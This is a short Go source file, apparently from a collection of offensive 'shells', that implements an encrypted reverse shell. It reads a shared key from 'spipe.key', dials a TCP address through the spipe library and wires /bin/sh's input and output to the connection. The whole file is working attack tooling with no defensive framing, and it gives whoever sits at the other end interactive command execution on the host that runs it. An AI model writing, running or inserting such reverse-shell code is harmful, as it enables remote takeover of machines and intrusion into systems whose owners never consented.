//package shells
package main

import (
	"github.com/dchest/spipe"
	"io/ioutil"
	"net"
	"os/exec"
)

func ReverseShell(sharedKey []byte, network, address, shell string) {
	c, _ := spipe.Dial(sharedKey, network, address)
	cmd := exec.Command(shell)
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

func main() {
	sharedKey, err := ioutil.ReadFile("spipe.key")
	if err != nil {
		panic(err)
	}
	ReverseShell(sharedKey, "tcp", ":8000", "/bin/sh")
}
